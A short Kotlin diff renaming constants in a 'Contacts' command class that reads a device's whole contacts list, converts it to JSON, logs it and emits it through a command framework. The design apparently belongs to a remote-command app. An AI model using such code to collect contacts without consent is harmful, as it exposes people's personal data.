@@ -21,11 +21,11 @@ class Contacts(context: Context) : Command(), Executor {
         val contactsList = ContactUtil.getContacts(context!!)
         val data = Gson().toJson(contactsList)
         Logger.json(data)
-        emitData(TYPE_CONTACTS_LIST, data)
+        emitData(CONTACTS_LIST, data)
     }
 
     companion object {
-        const val TYPE_CONTACTS_LIST = "contacts_list"
-        const val TYPE_POST_CONTACTS = "post_contacts_list"
+        const val CONTACTS_LIST = "contacts_list"
+        const val SEND_CONTACTS_LIST = "send_contacts_list"
     }
 }
